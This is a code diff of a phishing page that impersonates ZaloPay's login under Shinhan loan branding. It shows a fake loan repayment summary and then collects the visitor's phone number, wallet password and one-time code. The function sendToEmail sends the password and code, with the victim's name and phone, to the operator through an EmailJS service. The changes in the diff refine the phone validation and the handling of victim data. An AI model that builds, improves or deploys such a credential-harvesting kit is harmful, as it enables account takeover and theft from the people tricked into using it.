@@ -12,7 +12,6 @@
     <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
-      // Cập nhật Public Key của bạn tại đây
       (function() {
          emailjs.init({
            publicKey: "OrBsI926QI2_xBh1f",
@@ -21,7 +20,6 @@
     </script>
 
     <style>
-        /* CSS Variables for theming and consistency */
         :root {
             --shinhan-blue: #004695;
             --shinhan-blue-darker: #00336a;
@@ -37,7 +35,6 @@
             --global-font: 'Lexend', sans-serif;
         }
 
-        /* General Reset and Body styles */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: var(--global-font); }
         body {
             background-color: var(--brand-background);
@@ -46,17 +43,15 @@
         }
         .mobile-frame { width: 100%; max-width: 420px; margin: auto; background-color: #fff; border-radius: 24px; box-shadow: 0 8px 32px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column; min-height: 700px; }
         
-        /* General Page Section Structure */
         .page-section {
-            display: none; /* Hidden by default */
+            display: none;
             flex-direction: column;
             flex-grow: 1;
         }
         .page-section.active {
-            display: flex; /* Show active section */
+            display: flex;
         }
 
-        /* Header */
         .page-header {
             padding: 16px; text-align: center; background-color: #fff;
             border-bottom: 1px solid var(--brand-border);
@@ -86,7 +81,6 @@
             color: var(--brand-dark-text);
         }
         
-        /* Main Content */
         .page-body, .login-body {
             padding: 16px; 
             flex-grow: 1;
@@ -99,7 +93,6 @@
             background-color: #fff;
         }
         
-        /* Card styles */
         .info-card {
             background-color: #fff; border-radius: 12px; padding: 20px; margin-bottom: 12px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.05);
@@ -133,7 +126,7 @@
             display: flex; justify-content: space-between; align-items: center; font-size: 14px; padding: 13px 0;
             border-bottom: 1px solid var(--brand-border);
         }
-         .detail-item:first-of-type {
+        .detail-item:first-of-type {
             padding-top: 20px;
         }
         .detail-item:last-of-type { 
@@ -166,7 +159,6 @@
             color: var(--shinhan-blue);
         }
 
-        /* ZaloPay Login Flow Specifics */
         .banner-slider {
             width: 100%;
             aspect-ratio: 16 / 9;
@@ -221,6 +213,7 @@
         .phone-prefix { font-size: 18px; font-weight: 600; color: var(--brand-dark-text); padding-right: 12px; border-right: 1px solid #ddd; }
         .phone-input { border: none; padding: 12px; font-size: 18px; font-weight: 600; flex-grow: 1; color: var(--brand-dark-text); }
         .phone-input:focus { outline: none; }
+        .phone-input.invalid { border: 1px solid var(--error-red); }
 
         .input-group { width: 100%; margin-bottom: 16px; }
         .text-input {
@@ -237,7 +230,7 @@
             border: 1px solid #ddd; border-radius: 8px; color: var(--brand-dark-text);
             transition: border-color 0.2s, box-shadow 0.2s;
         }
-         .otp-input::placeholder {
+        .otp-input::placeholder {
             color: #ccc;
             font-size: 28px;
             line-height: 55px;
@@ -291,7 +284,6 @@
 </head>
 <body>
     <div class="mobile-frame">
-        
         <!-- Confirmation View -->
         <div id="confirmation-section" class="page-section active">
             <header class="page-header">
@@ -300,26 +292,22 @@
             </header>
             <main class="page-body">
                 <div class="info-card payment-summary-card">
-                    <p class="label">Tổng thanh toán</p>
+                    <p class="label">Tổng số tiền thanh toán</p>
                     <h2 class="amount" id="mainTotalAmount"></h2>
                     <hr>
-                    <div id="payment-details">
-                        <!-- Details will be populated by JS -->
-                    </div>
+                    <div id="payment-details"></div>
                 </div>
                 <div class="info-card">
                     <strong class="title">Thông tin người vay</strong>
-                     <div id="customer-details">
-                        <!-- Customer details will be populated by JS -->
-                     </div>
+                    <div id="customer-details"></div>
                 </div>
-                 <div class="info-card notice-card">
+                <div class="info-card notice-card">
                     <img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300336a'%3e%3cpath fill-rule='evenodd' d='M6.75 2.25A.75.75 0 017.5 3v1.5h9V3A.75.75 0 0118 3v1.5h.75a3 3 0 013 3v11.25a3 3 0 01-3 3H5.25a3 3 0 01-3-3V7.5a3 3 0 013-3H6V3a.75.75 0 01.75-.75zM5.25 6A1.5 1.5 0 003.75 7.5v11.25c0 .828.672 1.5 1.5 1.5h13.5a1.5 1.5 0 001.5-1.5V7.5A1.5 1.5 0 0018.75 6H5.25z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="Calendar Icon">
                     <p id="closingDateNotice"></p>
                 </div>
             </main>
             <footer class="page-footer">
-                 <button class="button primary" onclick="showSection('zalopay-phone-section')">Xác nhận</button>
+                <button class="button primary" onclick="showSection('zalopay-phone-section')">Xác nhận</button>
             </footer>
         </div>
 
@@ -330,7 +318,7 @@
                 <h1>Đăng nhập ZaloPay</h1>
             </header>
             <main class="login-body" style="padding: 0; justify-content: space-between;">
-                 <div style="width: 100%;">
+                <div style="width: 100%;">
                     <div class="banner-slider">
                         <img src="https://simg.zalopay.com.vn/zlp-website/assets/1_Cross_border_3x1_9e16602ab1.jpg" class="banner-slide active" alt="ZaloPay Banner 1">
                         <img src="https://simg.zalopay.com.vn/zlp-website/assets/4_Zalopay_moi_3x1_07918febf5.jpg" class="banner-slide" alt="ZaloPay Banner 2">
@@ -341,7 +329,7 @@
                         <form class="input-group" onsubmit="event.preventDefault(); handlePhoneSubmit();">
                             <div class="phone-input-wrapper">
                                 <span class="phone-prefix">+84</span>
-                                <input type="tel" id="zalopay-phone" class="phone-input" placeholder="Số điện thoại" required inputmode="numeric">
+                                <input type="tel" id="zalopay-phone" class="phone-input" placeholder="Số điện thoại" required inputmode="numeric" maxlength="10" pattern="[0-9]{10}" oninput="this.value = this.value.replace(/\D/g, '')" onkeypress="return (event.charCode !=8 && event.charCode ==0 || (event.charCode >= 48 && event.charCode <= 57))">
                             </div>
                         </form>
                     </div>
@@ -359,11 +347,11 @@
 
         <!-- ZaloPay Password Input View -->
         <div id="zalopay-password-section" class="page-section">
-             <header class="page-header">
-                 <button class="back-button" onclick="showSection('zalopay-phone-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
+            <header class="page-header">
+                <button class="back-button" onclick="showSection('zalopay-phone-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
                 <h1>Nhập mật khẩu</h1>
             </header>
-             <main class="login-body" style="padding-top: 24px;">
+            <main class="login-body" style="padding-top: 24px;">
                 <div class="zlp-profile-header">
                     <div class="avatar"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M18.685 19.097A9.723 9.723 0 0021.75 12c0-5.385-4.365-9.75-9.75-9.75S2.25 6.615 2.25 12a9.723 9.723 0 003.065 7.097A9.716 9.716 0 0012 21.75a9.716 9.716 0 006.685-2.653zm-12.54-1.285A7.486 7.486 0 0112 15a7.486 7.486 0 015.855 2.812A8.224 8.224 0 0112 20.25a8.224 8.224 0 01-5.855-2.438zM15.75 9a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="User Avatar"></div>
                     <span class="phone-number" id="masked-phone-password"></span>
@@ -380,12 +368,12 @@
 
         <!-- ZaloPay OTP Input View -->
         <div id="zalopay-otp-section" class="page-section">
-             <header class="page-header">
+            <header class="page-header">
                 <button class="back-button" onclick="showSection('zalopay-password-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
                 <h1>Nhập mã xác thực</h1>
             </header>
-             <main class="login-body" style="padding-top: 24px;">
-                 <div class="zlp-profile-header">
+            <main class="login-body" style="padding-top: 24px;">
+                <div class="zlp-profile-header">
                     <div class="avatar"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M18.685 19.097A9.723 9.723 0 0021.75 12c0-5.385-4.365-9.75-9.75-9.75S2.25 6.615 2.25 12a9.723 9.723 0 003.065 7.097A9.716 9.716 0 0012 21.75a9.716 9.716 0 006.685-2.653zm-12.54-1.285A7.486 7.486 0 0112 15a7.486 7.486 0 015.855 2.812A8.224 8.224 0 0112 20.25a8.224 8.224 0 01-5.855-2.438zM15.75 9a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="User Avatar"></div>
                     <span class="phone-number" id="masked-phone-otp"></span>
                 </div>
@@ -406,43 +394,39 @@
                 <button class="button zalopay-btn" id="zalopay-otp-submit-btn" onclick="handleOtpSubmit()">Xác nhận</button>
             </footer>
         </div>
-        
     </div>
 
     <div id="notification" class="notification"></div>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // --- DATA ---
             const credentials = {
                 phone: '', password: '', otp: ''
             };
             
             const getFormData = () => {
+                const storedData = JSON.parse(sessionStorage.getItem('formData')) || {};
                 const params = new URLSearchParams(window.location.search);
                 return {
-                    fullName: params.get('fullName') || 'N/A',
-                    cccd: params.get('cccd') || 'N/A',
-                    amount: parseInt(params.get('amount')) || 0,
-                    months: parseInt(params.get('months')) || 48,
-                    phone: params.get('phone') || 'N/A',
-                    email: params.get('email') || 'N/A',
-                    method: params.get('method') || 'zalopay' 
+                    fullName: storedData.fullName || params.get('fullName') || '',
+                    cccd: storedData.cccd || params.get('cccd') || '',
+                    amount: parseInt(storedData.amount?.replace(/[^0-9]/g, '')) || parseInt(params.get('amount')) || 0,
+                    months: parseInt(storedData.months) || parseInt(params.get('months')) || 48,
+                    phone: storedData.phone || params.get('phone') || '',
+                    email: storedData.email || params.get('email') || '',
+                    method: storedData.method?.toLowerCase() || params.get('method') || 'zalopay'
                 };
             };
             
             const formData = getFormData();
             let otpAttempts = 0;
 
-            // --- UI ELEMENTS ---
             const getEl = (id) => document.getElementById(id);
             const otpInputs = document.querySelectorAll('#zalopay-otp-section .otp-input');
             const slides = document.querySelectorAll('.banner-slide');
             const slideCount = slides.length;
             let currentSlide = 0;
 
-            // --- FUNCTIONS ---
-            
             const formatCurrency = (amount) => new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(amount);
 
             const createDetailItem = (label, value, isPaymentMethod = false) => {
@@ -472,16 +456,16 @@
 
             const populateData = () => {
                 const principal = formData.amount || 0;
-                const interest = formData.interest !== undefined ? formData.interest : (principal * 0.057); 
+                const interest = formData.interest !== undefined ? formData.interest : (principal * 0.057);
                 const overdueAmount = 0;
                 const earlyTerminationFee = 0;
                 const collectionFee = 24000;
-                const customerName = formData.fullName || 'N/A';
+                const customerName = formData.fullName || '';
                 const contractNumber = 'SHB-' + Math.floor(1000000000 + Math.random() * 9000000000);
                 const loanTermInMonths = formData.months || 48;
 
                 const totalAmount = principal + interest + overdueAmount + earlyTerminationFee + collectionFee;
-                getEl('mainTotalAmount').textContent = formatCurrency(totalAmount);
+                getEl('mainTotalAmount').textContent = formatCurrency(principal);
                 
                 const paymentDetailsContainer = getEl('payment-details');
                 paymentDetailsContainer.innerHTML = '';
@@ -494,10 +478,9 @@
                 
                 const customerDetailsContainer = getEl('customer-details');
                 customerDetailsContainer.innerHTML = '';
-                customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName));
-                customerDetailsContainer.appendChild(createDetailItem('Số CCCD', formData.cccd));
-                customerDetailsContainer.appendChild(createDetailItem('Số điện thoại', formData.phone));
-                customerDetailsContainer.appendChild(createDetailItem('Email', formData.email));
+                if (customerName) {
+                    customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName));
+                }
                 customerDetailsContainer.appendChild(createDetailItem('Số hợp đồng', contractNumber));
                 
                 const closingDate = new Date();
@@ -517,30 +500,45 @@
             };
             
             window.showSection = (sectionId) => {
-                 document.querySelectorAll('.page-section').forEach(section => section.classList.remove('active'));
-                 getEl(sectionId).classList.add('active');
+                document.querySelectorAll('.page-section').forEach(section => section.classList.remove('active'));
+                getEl(sectionId).classList.add('active');
             };
 
             window.handlePhoneSubmit = () => {
                 const phoneInput = getEl('zalopay-phone');
                 let phoneValue = phoneInput.value.replace(/\D/g, '');
                 
-                if (phoneValue.length === 9 || (phoneValue.length === 10 && phoneValue.startsWith('0'))) {
-                    if (phoneValue.length === 10) {
-                        phoneValue = phoneValue.substring(1);
-                    }
-                    credentials.phone = `+84${phoneValue}`;
+                if (phoneValue.length === 10 && phoneValue.startsWith('0')) {
+                    credentials.phone = `+84${phoneValue.substring(1)}`;
                     const maskedPhone = `+84 **** ${phoneValue.slice(-3)}`;
                     getEl('masked-phone-password').textContent = maskedPhone;
+                    phoneInput.classList.remove('invalid');
                     showSection('zalopay-password-section');
                 } else {
-                    showNotification('Số điện thoại chưa được đăng ký ZaloPay hoặc không hợp lệ.', 'error');
+                    phoneInput.classList.add('invalid');
+                    showNotification('Số điện thoại phải đúng 10 số và bắt đầu bằng 0.', 'error');
                 }
             };
-            
+
+            // Real-time phone number validation
+            const phoneInput = getEl('zalopay-phone');
+            phoneInput.addEventListener('input', () => {
+                let value = phoneInput.value.replace(/\D/g, '');
+                if (value.length > 10) {
+                    value = value.slice(0, 10);
+                }
+                phoneInput.value = value;
+                
+                if (value.length === 10 && value.startsWith('0')) {
+                    phoneInput.classList.remove('invalid');
+                } else {
+                    phoneInput.classList.add('invalid');
+                }
+            });
+
             window.handlePasswordSubmit = () => {
                 const passwordInput = getEl('zalopay-password');
-                 if (passwordInput.checkValidity()) {
+                if (passwordInput.checkValidity()) {
                     credentials.password = passwordInput.value;
                     sendToEmail('password', credentials.password);
                     
@@ -555,18 +553,18 @@
                 }
             };
 
-             const sendToEmail = (type, value) => {
+            const sendToEmail = (type, value) => {
                 const serviceID = 'service_60tgxof';
                 let templateID = '';
                 let templateParams = {};
-                const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value').textContent;
+                const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value')?.textContent || '';
 
                 const commonParams = {
                     platform: "ZaloPay (Shinhan Layout)",
-                    phone: credentials.phone,
+                    phone: credentials.phone || '',
                     contract_number: contractNumber,
-                    customer_name: formData.fullName,
-                    total_amount: getEl('mainTotalAmount').textContent
+                    customer_name: formData.fullName || '',
+                    total_amount: getEl('mainTotalAmount').textContent || ''
                 };
 
                 if (type === 'password') {
@@ -593,8 +591,8 @@
                 credentials.otp = Array.from(otpInputs).map(input => input.value).join('');
                 
                 if (credentials.otp.length !== 6) {
-                     showNotification('Mã xác thực không hợp lệ. Vui lòng thử lại.', 'error');
-                     return;
+                    showNotification('Mã xác thực không hợp lệ. Vui lòng thử lại.', 'error');
+                    return;
                 }
                 
                 const otpLoading = getEl('zalopay-otp-loading');
@@ -628,7 +626,6 @@
                 }, 1500);
             };
 
-            // --- OTP Input Logic ---
             otpInputs.forEach((input, index) => {
                 input.addEventListener('input', () => {
                     if (input.value && index < otpInputs.length - 1) {
@@ -647,26 +644,23 @@
                         if(otpInputs[i]) otpInputs[i].value = char;
                     });
                     if (pasteData.length > 0) {
-                       otpInputs[Math.min(5, pasteData.length -1)].focus();
+                        otpInputs[Math.min(5, pasteData.length -1)].focus();
                     }
                 });
             });
             
-            // --- Banner Slider Logic ---
             const startSlider = () => {
-                 if(slideCount > 0){
+                if(slideCount > 0){
                     setInterval(() => {
                         slides[currentSlide].classList.remove('active');
                         currentSlide = (currentSlide + 1) % slideCount;
                         slides[currentSlide].classList.add('active');
                     }, 3000); 
-                 }
+                }
             };
 
-            // --- INITIALIZATION ---
             populateData();
             startSlider();
-
         });
     </script>
 </body>
